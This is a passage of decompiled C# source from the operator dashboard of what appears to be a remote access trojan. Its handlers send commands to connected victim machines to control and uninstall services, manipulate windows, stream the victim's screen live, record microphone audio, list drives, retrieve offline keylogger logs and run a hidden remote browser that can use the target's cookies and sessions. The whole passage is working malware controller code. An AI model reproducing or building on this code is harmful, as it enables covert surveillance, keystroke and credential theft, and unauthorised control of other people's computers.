					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000921 RID: 2337 RVA: 0x0004C864 File Offset: 0x0004AA64
	private void method_194(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_552().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06000922 RID: 2338 RVA: 0x00006A48 File Offset: 0x00004C48
	private void method_195(object sender, ColumnClickEventArgs e)
	{
		if (this.vmethod_388().Sorting == SortOrder.Ascending)
		{
			this.vmethod_388().Sorting = SortOrder.Descending;
		}
		else
		{
			this.vmethod_388().Sorting = SortOrder.Ascending;
		}
		this.vmethod_388().Sort();
	}

	// Token: 0x06000923 RID: 2339 RVA: 0x0004C8D0 File Offset: 0x0004AAD0
	private void method_196(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "srv_start|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text));
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000924 RID: 2340 RVA: 0x0004C9D8 File Offset: 0x0004ABD8
	private void method_197(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text)) + "|1";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000925 RID: 2341 RVA: 0x0004CAE4 File Offset: 0x0004ACE4
	private void method_198(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text)) + "|2";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000926 RID: 2342 RVA: 0x0004CBF0 File Offset: 0x0004ADF0
	private void method_199(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text)) + "|3";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000927 RID: 2343 RVA: 0x0004CCFC File Offset: 0x0004AEFC
	private void method_200(object sender, EventArgs e)
	{
		checked
		{
			if (MessageBox.Show("Are you sure you want to uninstall the selected service(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes && this.vmethod_578().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "srv_uninstall|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(gclass.Items[i].Text));
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000928 RID: 2344 RVA: 0x0004CE1C File Offset: 0x0004B01C
	private void method_201(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x06000929 RID: 2345 RVA: 0x0004CF14 File Offset: 0x0004B114
	private void method_202(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_578().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_578();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text += gclass.Items[i].Text;
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						text = text + "\t" + gclass.Items[i].SubItems[j].Text;
					}
					text += "\r\n";
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x0600092A RID: 2346 RVA: 0x0004CFF4 File Offset: 0x0004B1F4
	private void method_203(object sender, MouseEventArgs e)
	{
		this.vmethod_344().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().SelectedItems.Count > 0, true, false));
		this.vmethod_334().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().SelectedItems.Count > 0, true, false));
		this.vmethod_338().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_316().Items.Count > 0, true, false));
	}

	// Token: 0x0600092B RID: 2347 RVA: 0x00006A7D File Offset: 0x00004C7D
	private void method_204(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 14;
		this.method_41();
	}

	// Token: 0x0600092C RID: 2348 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_205(object sender, EventArgs e)
	{
	}

	// Token: 0x0600092D RID: 2349 RVA: 0x00006A92 File Offset: 0x00004C92
	private void method_206(object sender, FormatRowEventArgs e)
	{
		if (Operators.CompareString(((fDashboard.Class126)e.Model).string_1, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
		{
			e.Item.BackColor = Color.DeepSkyBlue;
		}
	}

	// Token: 0x0600092E RID: 2350 RVA: 0x0004D0A0 File Offset: 0x0004B2A0
	private void method_207(object sender, KeyEventArgs e)
	{
		if (e.KeyData == (Keys)131137)
		{
			try
			{
				foreach (object obj in this.vmethod_578().Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x0600092F RID: 2351 RVA: 0x0004D10C File Offset: 0x0004B30C
	private void method_208(object sender, EventArgs e)
	{
		this.vmethod_624().Enabled = false;
		this.vmethod_624().Items.Clear();
		this.vmethod_614().BringToFront();
		this.vmethod_614().Visible = true;
		string text = this.string_4;
		string text2 = "wnd_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000930 RID: 2352 RVA: 0x0004D1C4 File Offset: 0x0004B3C4
	private void method_209(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|1";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000931 RID: 2353 RVA: 0x0004D2CC File Offset: 0x0004B4CC
	private void method_210(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|3";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000932 RID: 2354 RVA: 0x0004D3D4 File Offset: 0x0004B5D4
	private void method_211(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|6";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000933 RID: 2355 RVA: 0x0004D4DC File Offset: 0x0004B6DC
	private void method_212(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|11";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000934 RID: 2356 RVA: 0x0004D5E4 File Offset: 0x0004B7E4
	private void method_213(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|9";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000935 RID: 2357 RVA: 0x0004D6EC File Offset: 0x0004B8EC
	private void method_214(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|0";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000936 RID: 2358 RVA: 0x0004D7F4 File Offset: 0x0004B9F4
	private void method_215(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "wnd_cmd|" + gclass.Items[i].SubItems[2].Text + "|-1";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000937 RID: 2359 RVA: 0x0004D8FC File Offset: 0x0004BAFC
	private void method_216(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter a new title", Application.ProductName, string.Empty, -1, -1);
		if (Operators.CompareString(text, string.Empty, true) == 0 | text.Length > 260)
		{
			Interaction.MsgBox("Invalid title!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text2 = this.string_4;
						string text3 = "wnd_title|" + gclass.Items[i].SubItems[2].Text + "|" + text;
						string text4 = text2;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text4;
						@class.string_1 = text3;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000938 RID: 2360 RVA: 0x0004DA50 File Offset: 0x0004BC50
	private void method_217(object sender, EventArgs e)
	{
		int selectedIndex = this.vmethod_18().SelectedIndex;
		if (selectedIndex != 2)
		{
			switch (selectedIndex)
			{
			case 9:
				if (this.vmethod_718().Items.Count > 0)
				{
					this.vmethod_676().Text = "Selected: " + Conversions.ToString(this.vmethod_718().SelectedItems.Count);
					return;
				}
				break;
			case 10:
			case 11:
				break;
			case 12:
				if (this.vmethod_550().Items.Count > 0)
				{
					this.vmethod_674().Text = "Selected: " + Conversions.ToString(this.vmethod_550().SelectedItems.Count);
					return;
				}
				break;
			case 13:
				if (this.vmethod_578().Items.Count > 0)
				{
					this.vmethod_666().Text = "Selected: " + Conversions.ToString(this.vmethod_578().SelectedItems.Count);
					return;
				}
				break;
			case 14:
				if (this.vmethod_624().Items.Count > 0)
				{
					this.vmethod_672().Text = "Selected: " + Conversions.ToString(this.vmethod_624().SelectedItems.Count);
				}
				break;
			default:
				return;
			}
		}
		else if (this.vmethod_78().Items.Count > 0)
		{
			this.vmethod_670().Text = "Selected: " + Conversions.ToString(this.vmethod_78().SelectedItems.Count);
			return;
		}
	}

	// Token: 0x06000939 RID: 2361 RVA: 0x0004DBD4 File Offset: 0x0004BDD4
	private void method_218(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text += gclass.Items[i].Text;
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							text = text + "\t" + gclass.Items[i].SubItems[j].Text;
						}
						text += "\r\n";
					}
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x0600093A RID: 2362 RVA: 0x0004DCCC File Offset: 0x0004BECC
	private void method_219(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_624().Items.Count != 0)
			{
				Clipboard.Clear();
				string text = null;
				GClass7 gclass = this.vmethod_624();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text += gclass.Items[i].Text;
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						text = text + "\t" + gclass.Items[i].SubItems[j].Text;
					}
					text += "\r\n";
				}
				if (Operators.CompareString(text, null, true) != 0)
				{
					string text2 = text.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text2.Remove(text2.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x0600093B RID: 2363 RVA: 0x00006AD1 File Offset: 0x00004CD1
	private void method_220(object sender, EventArgs e)
	{
		Interaction.MsgBox("The web browser will attempt to launch in Incognito mode.\r\n\r\nNote: This feature is only compatible with Chrome.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x0600093C RID: 2364 RVA: 0x00006AE5 File Offset: 0x00004CE5
	private void method_221(object sender, EventArgs e)
	{
		Interaction.MsgBox("The web browser will forcefully attempt to create and use a new profile, thus preventing any unwanted interference.\r\n\r\nNote: If existing sessions, cookies or cache is needed then do not use this feature. Instead, start the remote browser whenever the target browser is not running, or closed.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x0600093D RID: 2365 RVA: 0x0004DDAC File Offset: 0x0004BFAC
	private void method_222(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_686().Text, "Start", true) == 0)
		{
			try
			{
				Class130.concurrentDictionary_3[this.string_4].SCREEN_IS_STREAMING = true;
				string text = this.string_4;
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"screenlive|",
					this.string_4,
					"|",
					Conversions.ToString(this.vmethod_88().SelectedIndex),
					"|",
					Conversions.ToString(Conversions.ToInteger(Strings.Replace(this.vmethod_82().Text, "%", string.Empty, 1, -1, CompareMethod.Text))),
					"|",
					Conversions.ToString(this.vmethod_688().Value),
					"|"
				}), Interaction.IIf(this.vmethod_96().Checked, "1", "0")), "|"), Interaction.IIf(this.vmethod_98().Checked, "1", "0")), "|"), this.vmethod_250().SelectedIndex), "|"), this.vmethod_24().Width), "|"), this.vmethod_24().Height), "|"), Interaction.IIf(this.vmethod_246().Checked, "1", "0")));
				string text3 = text;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				this.vmethod_686().Text = "Stop";
				this.vmethod_24().Focus();
				this.vmethod_246().Enabled = false;
				this.vmethod_86().Enabled = false;
				this.vmethod_88().Enabled = false;
				this.vmethod_250().Enabled = false;
				return;
			}
			catch (Exception ex2)
			{
				return;
			}
		}
		if (Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0)
		{
			try
			{
				this.vmethod_686().Enabled = false;
				string text4 = this.string_4;
				string text2 = "screenlive_stop|1";
				string text3 = text4;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
				if (Class130.concurrentDictionary_3.ContainsKey(this.string_4) && Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].SCREENLIVE_SOCKET_ID))
				{
					CClient cclient = Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].SCREENLIVE_SOCKET_ID];
					bool flag = true;
					cclient.SOCKET_DISCONNECT(ref flag);
				}
			}
			catch (Exception ex4)
			{
			}
		}
	}

	// Token: 0x0600093E RID: 2366 RVA: 0x0004E17C File Offset: 0x0004C37C
	private void method_223(object sender, ScrollEventArgs e)
	{
		this.vmethod_92().Text = Conversions.ToString(this.vmethod_688().Value) + "%";
		if (Operators.CompareString(this.string_4, null, true) != 0)
		{
			string text = this.string_4;
			string text2 = "screenlive_quality|" + Conversions.ToString(this.vmethod_688().Value);
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
		this.vmethod_24().Focus();
	}

	// Token: 0x0600093F RID: 2367 RVA: 0x0004E258 File Offset: 0x0004C458
	private void method_224(object sender, MouseEventArgs e)
	{
		this.vmethod_40().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
		this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
		this.vmethod_46().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
		this.vmethod_50().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
		this.vmethod_48().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_78().SelectedItems.Count > 0, true, false));
	}

	// Token: 0x06000940 RID: 2368 RVA: 0x0004E36C File Offset: 0x0004C56C
	private void method_225(object sender, EventArgs e)
	{
		string text2;
		string text3;
		Class136.Class138 @class;
		if (Operators.CompareString(this.vmethod_692().Text, "Start", true) == 0)
		{
			this.int_3 = Conversions.ToInteger(this.vmethod_304().SelectedItem.ToString());
			this.int_4 = Conversions.ToInteger(this.vmethod_320().SelectedItem.ToString());
			this.vmethod_304().Enabled = false;
			this.vmethod_320().Enabled = false;
			string text = this.string_4;
			text2 = string.Concat(new string[]
			{
				"aud_rec_start|",
				Conversions.ToString(this.int_4),
				"|",
				Conversions.ToString(this.int_3),
				"|",
				Conversions.ToString(this.vmethod_326().SelectedIndex)
			});
			text3 = text;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			this.vmethod_342().Tag = Class136.smethod_36();
			this.vmethod_692().Text = "Stop";
			this.vmethod_692().Refresh();
			this.vmethod_326().Enabled = false;
			return;
		}
		this.vmethod_342().Tag = string.Empty;
		this.vmethod_304().Enabled = true;
		this.vmethod_320().Enabled = true;
		this.vmethod_326().Enabled = true;
		string text4 = this.string_4;
		text2 = "aud_rec_stop|1";
		text3 = text4;
		@class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex2)
		{
		}
		this.vmethod_692().Text = "Start";
		this.vmethod_692().Refresh();
	}

	// Token: 0x06000941 RID: 2369 RVA: 0x0004E5A8 File Offset: 0x0004C7A8
	private void method_226(object sender, EventArgs e)
	{
		this.vmethod_694().Enabled = false;
		string text = this.string_4;
		string text2 = "aud_rec_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000942 RID: 2370 RVA: 0x00006AF9 File Offset: 0x00004CF9
	private void method_227(object sender, EventArgs e)
	{
		this.method_228();
	}

	// Token: 0x06000943 RID: 2371 RVA: 0x0004E63C File Offset: 0x0004C83C
	private void method_228()
	{
		this.vmethod_446().Enabled = false;
		this.vmethod_448().Enabled = false;
		this.vmethod_450().Enabled = false;
		this.vmethod_696().Enabled = false;
		this.vmethod_452().Enabled = false;
		this.vmethod_454().Enabled = false;
		this.vmethod_76().Enabled = false;
		this.string_8 = string.Empty;
		this.vmethod_398().Text = "Path: N/A";
		this.vmethod_720().Items.Clear();
		this.vmethod_76().Items.Clear();
		this.vmethod_474().BringToFront();
		this.vmethod_474().Visible = true;
		string text = this.string_4;
		string text2 = "drives_get|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000944 RID: 2372 RVA: 0x0004E768 File Offset: 0x0004C968
	private void method_229(object sender, EventArgs e)
	{
		this.vmethod_204().Visible = false;
		this.vmethod_214().Value = 0;
		this.vmethod_208().Text = "Current: N/ A";
		if (this.vmethod_156().Top < this.vmethod_204().Top)
		{
			this.vmethod_156().Top = this.vmethod_204().Top;
			return;
		}
		this.vmethod_204().Top = this.vmethod_156().Top;
	}

	// Token: 0x06000945 RID: 2373 RVA: 0x0004E7E4 File Offset: 0x0004C9E4
	private void method_230(object sender, EventArgs e)
	{
		this.vmethod_156().Visible = false;
		this.vmethod_160().Value = 0;
		this.vmethod_164().Text = "Current: N/A";
		if (this.vmethod_156().Top < this.vmethod_204().Top)
		{
			this.vmethod_156().Top = this.vmethod_204().Top;
			return;
		}
		this.vmethod_204().Top = this.vmethod_156().Top;
	}

	// Token: 0x06000946 RID: 2374 RVA: 0x0004E860 File Offset: 0x0004CA60
	private void method_231(object sender, EventArgs e)
	{
		this.vmethod_556().BringToFront();
		this.vmethod_556().Visible = true;
		this.vmethod_280().Clear();
		this.vmethod_280().Enabled = false;
		this.vmethod_388().Enabled = false;
		this.vmethod_712().Enabled = false;
		this.vmethod_702().Enabled = false;
		this.vmethod_704().Enabled = false;
		string text = this.string_4;
		string text2 = "klgoff_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000947 RID: 2375 RVA: 0x0004E944 File Offset: 0x0004CB44
	private void method_232(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_388().Items.Count > 0)
			{
				StringBuilder stringBuilder = new StringBuilder();
				int num = this.vmethod_388().Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(Operators.ConcatenateObject(this.vmethod_388().Items[i].Tag, "|"));
				}
				this.vmethod_556().BringToFront();
